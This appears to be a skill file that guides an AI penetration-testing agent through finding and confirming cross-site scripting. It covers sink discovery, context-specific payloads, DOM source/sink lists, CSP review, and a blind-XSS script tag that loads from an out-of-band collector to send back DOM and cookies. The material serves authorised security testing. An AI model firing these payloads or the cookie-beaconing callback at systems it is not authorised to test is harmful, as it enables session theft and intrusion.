---
name: web-xss
description: Use when user input may reflect into HTML/JS/attributes — reflected/stored/DOM XSS with context-aware payloads, CSP review, and blind callbacks. Class xss.
---

# Cross-site scripting (XSS)

Confirm execution, not just reflection. Avoid noisy `alert(1)` spam across a live app — one context-correct proof per sink is enough. Class `xss`, CWE-79.

Per candidate: `record kind=hypothesis ... class=xss outcome=testing` before firing payloads.

## 1. Find sinks
- Reflected: does the param value appear in the response? `curl -s "https://TARGET/s?q=pir3dCANARY" | grep -n pir3dCANARY` and note the **context** (HTML body, attribute, `<script>`, URL, JS string, comment).
- Stored: inputs that persist — profile, comments, filenames, user-agent logged to an admin panel.
- DOM: trace **source → sink** in JS.

## 2. Context-aware payload (match where the canary landed)
- HTML body: `<svg onload=confirm(document.domain)>`
- Attribute (inside `"`): `"><svg onload=...>` or break out with `" autofocus onfocus=...`
- Inside `<script>` / JS string: `';confirm(document.domain);//` or `</script><svg onload=...>`
- URL/href: `javascript:confirm(document.domain)`
- Test which chars survive first: `'"<>{}();` — send them and see what's encoded, then craft only what's needed.

## 3. DOM XSS (source → sink)
- Sources: `location`, `location.hash`, `document.URL`, `referrer`, `postMessage`, `localStorage`.
- Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `$(...).html()`, `insertAdjacentHTML`, framework `dangerouslySetInnerHTML`/`v-html`.
```bash
# pull JS and grep for sinks; trace back to a source
katana -u https://TARGET -jc -o evidence/js-urls.txt
curl -s https://TARGET/app.js | grep -nE 'innerHTML|document.write|eval\(|location.hash|postMessage'
```
Confirm in a browser/headless (mitmproxy or claude-in-chrome) since DOM XSS never appears in the raw HTTP response: `https://TARGET/#<img src=x onerror=confirm(1)>`.

## 4. CSP review
```bash
curl -sSI https://TARGET | grep -i content-security-policy
```
Weaknesses that make XSS exploitable: `unsafe-inline`, `unsafe-eval`, wildcard `*` or `data:` in `script-src`, missing `object-src 'none'`, JSONP/AngularJS on an allowlisted host, no `nonce`/`strict-dynamic`. A missing/weak CSP is a contributing low finding on its own.

## 5. Blind / stored XSS (fires elsewhere, e.g. an admin view)
Use an out-of-band collector so you learn when it executes:
```
"><script src=https://OOB_ID.xss.report></script>
```
Payload beacons back DOM/cookies to your XSS Hunter / interactsh listener. Record the callback URL you used in `evidence/`.

## Confirm vs false positive
- Reflection ≠ execution. Prove the JS **runs** (callback fires, `document.domain` shown, DOM changes) in the right context.
- Check output encoding: if `<` becomes `&lt;` in that context, it's not exploitable there — move on rather than recording noise.
- WAF-reflected payloads that are sanitized on render are not findings.

## Wire into the loop
```
record kind=hypothesis statement="q reflects unencoded into HTML body" target=e2 class=xss approach="canary then <svg onload>" outcome=confirmed evidence=evidence/xss-reflected.http
record kind=finding title="Reflected XSS in /search?q" severity=medium target=e2 class=xss cwe=CWE-79 status=confirmed hypothesisId=y6 repro="GET /search?q=<svg onload=confirm(document.domain)>" evidence=["evidence/xss-reflected.http"]
```
Severity: stored XSS hitting other users / admins = high; reflected = medium (high if it steals session/admin); self-XSS or heavily-mitigated = low/info.
